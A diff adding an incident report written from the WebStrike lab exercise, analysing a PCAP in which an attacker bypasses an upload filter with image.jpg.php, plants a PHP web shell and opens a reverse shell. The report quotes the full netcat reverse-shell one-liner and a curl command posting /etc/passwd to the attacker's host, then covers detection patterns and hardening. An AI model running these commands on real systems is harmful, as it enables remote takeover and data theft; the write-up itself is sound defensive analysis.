@@ -1,1 +1,79 @@
+NOTE: This report is based on WebStrike Lab Created by CyberDefendes and is intended to demonstrate my investigation, analysis, and incident reporting skills in a realistic, real‑world style.
 
+Incident Overview
+
+On 03/05/2026 at 9:25am on a public-facing web server, suspicious HTTP activity was identified and captured in a PCAP, 
+later confirming an attacker successfully uploaded and executed a malicious PHP web shell. The attacker then established a
+reverse shell, attempted to maintain interactive access, and tried to exfiltrate sensitive system information from the server.
+​
+Executive Summary
+
+An external attacker from Tianjin, China exploited insufficient file upload validation on the company’s reviews feature to deploy 
+a PHP web shell named image.jpg.php. Once the web shell was in place, the attacker initiated a reverse shell to their host on port 8080 
+and attempted to exfiltrate the /etc/passwd file over HTTP to an external server. Prompt detection and response would have required monitoring 
+of anomalous upload activity, outbound reverse-shell-style connections, and suspicious access to sensitive system files.
+
+Timeline of Events
+
+09:25 - Initial reconnaissance and interaction with a web server from IP 117.11.88.124 targeting 24.49.63.79.
+09:27 - Failed upload attempt of image.php to /reviews/upload.php blocked as “Invalid file format”.
+09:30 - Successful upload of image.jpg.php to /reviews/upload.php, stored under /reviews/uploads/.
+09:33 - Execution of the web shell and establishment of a reverse shell from the web server to 117.11.88.124 on TCP port 8080.
+09:37 - Execution of commands over the reverse shell, including a curl POST request attempting to send /etc/passwd to http://117.11.88.124:443/.
+
+Technical Analysis
+
+Initial Access and Origin
+PCAP analysis in Wireshark showed two main IPs, with 117.11.88.124 acting as the source of suspicious traffic to the web server at 24.49.63.79. 
+Using an IP geolocation service, this address was mapped to Tianjin, China, confirming the likely geographic origin of the attack. 
+The attacker’s HTTP requests used the User‑Agent string Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0, 
+consistent with a Linux-based Firefox client, likely chosen to blend with normal browser traffic.
+
+Exploitation and Web Shell Deployment
+
+The attacker targeted the file upload functionality at /reviews/upload.php. An initial attempt to upload image.php (containing reverse shell PHP code) 
+was blocked by server-side validation. The attacker then bypassed this control by renaming the payload to image.jpg.php, 
+exploiting weak content validation that relied primarily on file extension checks. The server responded with “File uploaded successfully”, 
+and subsequent traffic showed the upload being stored under /reviews/uploads/, confirming the storage location of potentially malicious files.
+
+Command and Control (C2)
+
+The malicious web shell contained PHP code invoking system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f");,
+which uses nc (netcat) to create a reverse shell back to the attacker. This established an outbound TCP connection from the victim server to the attacker’s host on port 8080,
+providing an interactive shell for remote command execution.
+
+Data Access and Exfiltration Attempt
+
+Filtering the PCAP on tcp.port == 8080 and ip.src == 24.49.63.79 revealed commands executed over the reverse shell, including: curl -X POST -d /etc/passwd http://117.11.88.124:443/
+This showed the attacker attempting to POST the contents of /etc/passwd to their external server over HTTPS. 
+While /etc/passwd does not normally contain password hashes on modern systems, it exposes valid usernames and system account structure, 
+aiding further enumeration and potential privilege escalation.
+
+Impact Assessment
+
+* Confidentiality: Attempted exfiltration of /etc/passwd exposes a list of local users and system information useful for follow-on attacks.
+* Integrity: The attacker gained the ability to execute arbitrary commands on the web server, which could be used to modify files or deploy additional malware.
+* Availability: No explicit disruption was observed in the PCAP, but the level of access would allow the attacker to degrade or take down the service.
+
+Detection Opportunities
+
+* Unusual POST requests to /reviews/upload.php with executable content or suspicious double extensions (e.g., .jpg.php).
+* HTTP access to /reviews/uploads/ that includes executable responses or direct access to recently uploaded files.
+* Outbound connections from the web server to untrusted external IPs on non-standard ports (e.g., TCP 8080) consistent with reverse shells.
+* Command-line patterns associated with reverse shells (mkfifo, nc, /bin/sh -i) in EDR or process monitoring telemetry.
+* Access and network transfer attempts involving /etc/passwd or other sensitive system files.
+
+Response and Containment Recommendations
+
+* Immediately block outbound connections from the web server to 117.11.88.124 and similar high-risk IPs at the firewall or security gateway.
+* Remove the image.jpg.php web shell and any other unauthorized content from /reviews/uploads/, and disable or restrict the upload functionality until secured.
+* Rotate credentials and review local accounts given the attempted access to /etc/passwd.
+* Conduct a broader compromise assessment on the host and surrounding environment to ensure no additional persistence mechanisms were deployed.
+
+Lessons Learned and Hardening
+
+* Enforce strict server-side validation for file uploads: validate MIME types, restrict allowed extensions to a safe allowlist,
+and store uploads outside the web root or serve them via a non-executable handler.
+* Implement web application firewall (WAF) rules to detect and block uploads of executable content and suspicious filename patterns (e.g., multiple extensions).
+* Monitor for reverse-shell indicators and unusual outbound connections from web servers, with alerts for connections to rare ports and newly seen destinations.
+* Add logging and alerting around access to sensitive system paths (e.g., /etc/passwd) and outbound data transfers to external IPs.
